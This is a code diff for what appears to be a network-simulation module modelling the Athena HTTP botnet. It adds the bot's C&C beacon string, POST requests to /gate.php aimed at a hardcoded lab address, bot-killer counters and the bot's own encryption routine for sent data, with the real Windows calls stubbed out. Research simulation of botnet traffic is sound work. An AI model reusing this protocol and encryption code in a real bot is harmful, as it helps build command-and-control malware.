@@ -24,6 +24,11 @@ Define_Module(AthenaBot);
 AthenaBot::AthenaBot()
 {
     bNewInstallation = true;
+
+    // Bot killer variables
+    dwKilledProcesses = 0;
+    dwFileChanges = 0;
+    dwRegistryKeyChanges = 0;
 }
 
 AthenaBot::~AthenaBot()
@@ -36,6 +41,9 @@ void AthenaBot::initialize(int stage)
 {
     EV_INFO << "Initializing Athena bot component, stage " << stage << endl;
 
+    //addGate("ethg", cGate::OUTPUT)->connectTo(getSimulation()->getModule());
+    std::string hostName = "Host " + this->getIndex();
+    this->setName(hostName.c_str());
     HttpBrowserBase::initialize(stage);
 
     if (stage == INITSTAGE_LOCAL) {
@@ -78,7 +86,7 @@ void AthenaBot::initialize(int stage)
 
         // Infected host
         isInfected = par("infected").boolValue();
-        newMessage = new cMessage("New Message");
+        botMessage = new cMessage("Bot Message");
     }
     else if (stage == INITSTAGE_APPLICATION_LAYER && isInfected) {
         EV_INFO << "Initializing Athena bot component -- phase 1\n";
@@ -104,9 +112,29 @@ void AthenaBot::initialize(int stage)
         if (rdBotActivityLength != nullptr)
             activationTime += (86400.0 - rdBotActivityLength->draw()) / 2; // First activate after half the sleep period
         EV_INFO << "Initial activation time is " << activationTime << endl;
-        newMessage->setKind(MSGKIND_ACTIVITY_BOT_START);
-        scheduleAt(simTime() + (simtime_t)activationTime, newMessage);
+        cServer = par("serverName").stringValue();
+        botMessage->setKind(MSGKIND_ACTIVITY_BOT_START);
+        scheduleAt(simTime() + (simtime_t)activationTime, botMessage);
     }
+}
+
+void AthenaBot::socketDataArrived(int connId, void *yourPtr, cPacket *msg, bool urgent)
+{
+    EV_INFO << "Socket data arrived on connection " << connId << ": " << msg->getName() << endl;
+    if (yourPtr == nullptr) {
+        EV_ERROR << "socketDataArrivedfailure. Null pointer" << endl;
+        return;
+    }
+
+    SockData *sockdata = (SockData *)yourPtr;
+    TCPSocket *socket = sockdata->socket;
+    handleDataMessage(msg);
+
+    if (--sockdata->pending == 0) {
+        EV_INFO << "Received last expected reply on this socket. Issuing a close" << endl;
+        socket->close();
+    }
+    // Message deleted in handler - do not delete here!
 }
 
 void AthenaBot::handleMessage(cMessage *msg)
@@ -140,19 +168,31 @@ void AthenaBot::handleMessage(cMessage *msg)
     }
 }
 
+void AthenaBot::handleDataMessage(cMessage *msg)
+{
+    httptools::HttpReplyMessage *appmsg = check_and_cast<httptools::HttpReplyMessage *>(msg);
+    if (appmsg == nullptr)
+        throw cRuntimeError("Message (%s)%s is not a valid reply message", msg->getClassName(), msg->getName());
+
+    logResponse(appmsg);
+    EV_INFO << "Message data: " << appmsg->payload() << endl;
+    delete appmsg;
+    return;
+}
+
 void AthenaBot::handleSelfMessages(cMessage *msg)
 {
     switch (msg->getKind()) {
         case MSGKIND_ACTIVITY_START:
-            handleSelfActivityStart();
+            //handleSelfActivityStart();
             break;
 
         case MSGKIND_START_SESSION:
-            handleSelfStartSession();
+            //handleSelfStartSession();
             break;
 
         case MSGKIND_NEXT_MESSAGE:
-            handleSelfNextMessage();
+            //handleSelfNextMessage();
             break;
 
         case MSGKIND_SCRIPT_EVENT:
@@ -167,8 +207,16 @@ void AthenaBot::handleSelfMessages(cMessage *msg)
             handleSelfBotStartSession();
             break;
 
+        case MSGKIND_BOT_REPEAT_SESSION:
+            handleSelfBotRepeatSession();
+            break;
+
+        case MSGKIND_BOT_RESPONSE_SESSION:
+            handleSelfBotResponseSession();
+            break;
+
         case HTTPT_DELAYED_REQUEST_MESSAGE:
-            handleSelfDelayedRequestMessage(msg);
+            //handleSelfDelayedRequestMessage(msg);
             break;
 
     }
@@ -177,13 +225,13 @@ void AthenaBot::handleSelfMessages(cMessage *msg)
 void AthenaBot::handleSelfActivityBotStart()
 {
     EV_INFO << "Starting new activity bot period @ T=" << simTime() << endl;
-    newMessage->setKind(MSGKIND_BOT_START_SESSION);
+    botMessage->setKind(MSGKIND_BOT_START_SESSION);
     messagesInCurrentSession = 0;
     reqNoInCurSession = 0;
     double activityPeriodLength = rdBotActivityLength->draw();    // Get the length of the activity period
     acitivityPeriodEnd = simTime() + activityPeriodLength;    // The end of the activity period
     EV_INFO << "Activity bot period starts @ T=" << simTime() << ". Activity period is " << activityPeriodLength / 3600 << " hours." << endl;
-    scheduleAt(simTime() + (simtime_t)rdBotInterSessionInterval->draw() / 2, newMessage);
+    scheduleAt(simTime() + (simtime_t)rdBotInterSessionInterval->draw() / 2, botMessage);
 }
 
 void AthenaBot::handleSelfBotStartSession()
@@ -195,8 +243,89 @@ void AthenaBot::handleSelfBotStartSession()
     reqNoInCurSession = (int)rdBotReqInSession->draw();
     EV_INFO << "Starting session # " << sessionCount << " @ T=" << simTime() << ". Requests in session are " << reqNoInCurSession << "\n";
     int nextMsgType = ConnectToHttp();
-    //scheduleNextBotEvent(nextMsgType);
+    scheduleNextBotEvent(nextMsgType);
 }
+
+void AthenaBot::handleSelfBotRepeatSession()
+{
+    EV_INFO << "Sending a repeat command to server @ T=" << simTime() << endl;
+    int nextMsgType;
+
+    char cDataToServer[MAX_HTTP_PACKET_LENGTH];
+    memset(cDataToServer, 0, sizeof(cDataToServer));
+
+    char cBusy[7];
+    memset(cBusy, 0, sizeof(cBusy));
+    bDdosBusy = IsAdmin(); // currently, IsAdmin() function act as head or tails
+    if(bDdosBusy)
+        strcpy(cBusy, "true");
+    else
+        strcpy(cBusy, "false");
+
+    sprintf(cDataToServer, "|type:repeat|uid:%s|ram:%d|bk_killed:%i|bk_files:%i|bk_keys:%i|busy:%s|",
+            cUuid, GetMemoryLoad(), dwKilledProcesses, dwFileChanges, dwRegistryKeyChanges, cBusy);
+
+    char cHttpHost[MAX_PATH];
+    memset(cHttpHost, 0, sizeof(cHttpHost));
+
+    char cHttpPath[DEFAULT];
+    memset(cHttpPath, 0, sizeof(cHttpPath));
+    char szModuleName[127];
+    int connectPort;
+
+    if (controller->getServerInfo(cServer, szModuleName, connectPort) != 0) {
+        EV_ERROR << "Unable to get server information from controller" << endl;
+        nextMsgType = on_exec;
+    }
+    EV_INFO << "Sending request to server " << cServer << " (" << szModuleName << ") on port " << connectPort << endl;
+
+    char cBreakUrl[strlen(cServer)];
+    memset(cBreakUrl, 0, sizeof(cBreakUrl));
+    strcpy(cBreakUrl, cServer);
+
+    char *pcBreakUrl = cBreakUrl;
+
+    if(strstr(pcBreakUrl, "http://"))
+        pcBreakUrl += 7;
+    else if(strstr(pcBreakUrl, "https://"))
+        pcBreakUrl += 8;
+
+    pcBreakUrl = strtok(pcBreakUrl, "/");
+    if(pcBreakUrl != NULL)
+        strcpy(cHttpHost, pcBreakUrl);
+
+    pcBreakUrl = strtok(NULL, "?");
+    if(pcBreakUrl != NULL)
+        strcpy(cHttpPath, pcBreakUrl);
+
+    strcpy(cHttpHostGlobal, cHttpHost);
+    strcpy(cHttpPathGlobal, cHttpPath);
+    if (!SendPanelRequest(httpreq, cHttpHost, cHttpPath, usPort, cDataToServer))
+        nextMsgType = repeat;
+    else
+        nextMsgType = on_exec;
+
+    scheduleNextBotEvent(nextMsgType);
+}
+
+void AthenaBot::handleSelfBotResponseSession()
+{
+   // TODO: Response for a command sent from C&C
+}
+
+void AthenaBot::scheduleNextBotEvent(int msgType)
+{
+    EV_INFO << "Scheduling new bot message @ T=" << simTime() << endl;
+    EV_INFO << "Message type: ";
+    switch (msgType) {
+    case on_exec: EV_INFO << "on_exec" << endl; botMessage->setKind(MSGKIND_BOT_START_SESSION); break;
+    case repeat: EV_INFO << "repeat" << endl; botMessage->setKind(MSGKIND_BOT_REPEAT_SESSION); break;
+    case response: EV_INFO << "response" << endl; botMessage->setKind(MSGKIND_BOT_RESPONSE_SESSION); break;
+    default: EV_ERROR << "Type not defined" << endl;
+    }
+    scheduleAt(simTime() + (simtime_t) (simtime_t)rdBotInterSessionInterval->draw() / 2, botMessage);
+}
+
 
 int AthenaBot::ConnectToHttp()
 {
@@ -236,7 +365,10 @@ int AthenaBot::ConnectToHttp()
         usPort = GetRandNum(100) + 1;
     // <!-------! CRC AREA STOP !-------!>
 
-    /*HW_PROFILE_INFO HwProfInfo;
+    /* UUID definition -- from hardware
+     *
+     */
+     /* HW_PROFILE_INFO HwProfInfo;
         while(!fncGetCurrentHwProfile(&HwProfInfo))
             Sleep(100);
 
@@ -248,7 +380,7 @@ int AthenaBot::ConnectToHttp()
         memset(cUuid, 0, sizeof(cUuid));
         memcpy(cUuid, cGuid + 1, 36);*/
 
-    // bUninstallProgram -- don't needed
+    // bUninstallProgram -- don't needed (currently, not supported)
     //while(!bUninstallProgram)
     {
         // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
@@ -308,13 +440,11 @@ int AthenaBot::ConnectToHttp()
         char szModuleName[127];
         int connectPort;
 
-        if (controller->getAnyServerInfo(cServer, szModuleName, connectPort) != 0) {
-            EV_ERROR << "Unable to get a random server from controller" << endl;
+        if (controller->getServerInfo(cServer, szModuleName, connectPort) != 0) {
+            EV_ERROR << "Unable to get server information from controller" << endl;
             return on_exec;
         }
-        EV_INFO << "Sending request to random server " << cServer << " (" << szModuleName << ") on port " << connectPort << endl;
-
-        //strcpy(cServer, "http://192.168.56.102/ ");
+        EV_INFO << "Sending request to server " << cServer << " (" << szModuleName << ") on port " << connectPort << endl;
 
         char cBreakUrl[strlen(cServer)];
         memset(cBreakUrl, 0, sizeof(cBreakUrl));
@@ -406,7 +536,6 @@ else if(cBackup != NULL)
         }
 
         // Schedule next event
-
         //while(!bUninstallProgram)
         /*
         {
@@ -495,6 +624,21 @@ void AthenaBot::StripDashes(char *pcString)
 /**
  * Utilities/ComputerInfo.cpp
  */
+unsigned int AthenaBot::GetMemoryLoad()
+{
+    /*
+    MEMORYSTATUS mStatus;
+    ZeroMemory(&mStatus, sizeof(mStatus));
+    mStatus.dwLength = sizeof(mStatus);
+    GlobalMemoryStatus(&mStatus);
+    DWORD dwLoad = (DWORD)(mStatus.dwMemoryLoad);
+    */
+    std::default_random_engine generator;
+    std::uniform_int_distribution<DWORD> distribution;
+    unsigned int dwLoad = distribution(generator);
+    return dwLoad;
+}
+
 char *AthenaBot::GetVersionMicrosoftDotNetVersion()
 {
     /*
@@ -634,22 +778,23 @@ bool AthenaBot::SendPanelRequest(SOCKADDR_IN httpreq, char *cHttpHost, char *cHt
     char cOutPacket[MAX_HTTP_PACKET_LENGTH];
     memset(cOutPacket, 0, sizeof(cOutPacket));
 
-    cReturnNewline[0] = ' ';
+    cReturnNewline[0] = '\r';
     cReturnNewline[1] = '\n';
+    cReturnNewline[2] = '\0';
     strcpy(cOutPacket, "POST /gate.php");
     strcat(cOutPacket, cHttpPath);
     strcat(cOutPacket, " HTTP/1.1");
     strcat(cOutPacket, cReturnNewline);
 
     strcat(cOutPacket, "Host: ");
-    strcat(cOutPacket, cHttpHost);
-    strcat(cOutPacket, ":");
-    char cHttpPort[7];
-    usHttpPort = 80;
-    memset(cHttpPort, 0, sizeof(cHttpPort));
+    //strcat(cOutPacket, cHttpHost);
+    //strcat(cOutPacket, ":");
+    //char cHttpPort[7];
+    //memset(cHttpPort, 0, sizeof(cHttpPort));
     //itoa(usHttpPort, cHttpPort, 10);
-    sprintf(cHttpPort, "%d", usHttpPort);
-    strcat(cOutPacket, cHttpPort);
+    //sprintf(cHttpPort, "%d", usHttpPort);
+    //strcat(cOutPacket, cHttpPort);
+    strcat(cOutPacket, "192.168.56.102");
     strcat(cOutPacket, cReturnNewline);
 
     strcat(cOutPacket, "Connection: close");
@@ -718,7 +863,7 @@ bool AthenaBot::SendPanelRequest(SOCKADDR_IN httpreq, char *cHttpHost, char *cHt
     strcat(cPacketData, cFinalOutData);
     strcat(cPacketData, "&c=");
     strcat(cPacketData, cUrlEncodedMarker);
-
+    strcat(cPacketData, "\n");
     //strcat(cOutPacket, cPacketData);
 //CopyToClipboard(cPacketData);
 
@@ -754,16 +899,8 @@ bool AthenaBot::SendPanelRequest(SOCKADDR_IN httpreq, char *cHttpHost, char *cHt
     msg->setKeepAlive(httpProtocol == 11);
     msg->setBadRequest(false);    // Simulates willingly requesting a non-existing resource.
     msg->setKind(HTTPT_REQUEST_MESSAGE);
-    char szModuleName[127];
-    strcpy(szModuleName, "192.168.56.102");
-
-    const char *connectAddress = par("connectAddress");
-    int connectPort = par("connectPort");
 
     sendRequestToServer(msg);
-    EV_INFO << "Sending request to server";
-    //EV_INFO << "Sending request to server " << request->targetUrl() << " (" << szModuleName << ") on port " << connectPort << endl;
-    //submitToSocket(connectAddress, connectPort, msg);
     /*
     if(fncconnect(sSock, (PSOCKADDR)&httpreq, sizeof(httpreq)) != SOCKET_ERROR)
     {
@@ -868,12 +1005,13 @@ bool AthenaBot::SendPanelRequest(SOCKADDR_IN httpreq, char *cHttpHost, char *cHt
 
     return bReturn;
     */
+
+    return bReturn;
 }
 void AthenaBot::EncryptSentData(char *cSource, char *cOutputData, char *cOutputEncryptedKey, char *cOutputRawKeyA, char *cOutputRawKeyB)
 {
     srand(GenerateRandomSeed());
 
-    /*
     char cKeyA[KEY_SIZE];
     memset(cKeyA, 0, sizeof(cKeyA));
     char cKeyB[KEY_SIZE];
@@ -899,8 +1037,8 @@ void AthenaBot::EncryptSentData(char *cSource, char *cOutputData, char *cOutputE
     strcpy(cOutputEncryptedKey, cKeyEncryptedB);
     strcpy(cOutputRawKeyA, cKeyA);
     strcpy(cOutputRawKeyB, cKeyB);
-    */
 
+    /*
     char cKeyA[KEY_SIZE];
     memset(cKeyA, 0, sizeof(cKeyA));
     char cKeyB[KEY_SIZE];
@@ -924,13 +1062,13 @@ void AthenaBot::EncryptSentData(char *cSource, char *cOutputData, char *cOutputE
     strcpy(cOutputEncryptedKey, cKey);
     strcpy(cOutputRawKeyA, cKeyA);
     strcpy(cOutputRawKeyB, cKeyB);
-
+     */
     /*
 #ifdef DEBUG
     printf("----------------------\nEncryption Communication Details:\nKey: %s\nKey StrongUrlEncoded: %s\nData Encrypted(strtr): %s\n", cKey, cKeyEncrypted, cEncrypted);
 #endif
 */
-    EV_INFO << "----------------------\nEncryption Communication Details:\nKey: " << cKey << "\nKey StrongUrlEncoded: " << cKeyEncrypted << "\nData Encrypted(strtr): " << cEncrypted << std::endl;
+    EV_INFO << "----------------------\nEncryption Communication Details:\nKey: " << cKey << "\nKey StrongUrlEncoded: " << cKeyEncryptedB << "\nData Encrypted(strtr): " << cEncryptedB << std::endl;
 }
 int AthenaBot::GeneratestrtrKey(char *cOutputA, char *cOutputB)
 {
@@ -1043,6 +1181,7 @@ char *AthenaBot::GenRandLCText() //Generates random lowercase text
 
     return (char*)cRandomText;
 }
+
 void AthenaBot::RunThroughUuidProcedure()
 {
     memset(cUuid, 0, sizeof(cUuid));
@@ -1148,7 +1287,7 @@ void AthenaBot::_base64_encode_triple(unsigned char triple[3], char result[4])
     tripleValue = triple[0];
     tripleValue *= 256;
     tripleValue += triple[1];
-
+    tripleValue *= 256;
     tripleValue += triple[2];
 
     for (i=0; i<4; i++)
@@ -1294,8 +1433,8 @@ size_t AthenaBot::base64_decode(const char *source, char *target, size_t targetl
 {
     char *src, *tmpptr;
     char quadruple[4], tmpresult[3];
-    int i, tmplen = 3;
-    size_t converted = 0;
+    int i;
+    size_t tmplen = 3, converted = 0;
 
     /* concatenate '===' to the source to handle unpadded base64 data */
     //src = (char *)HeapAlloc(GetProcessHeap(), 0, strlen(source)+5);
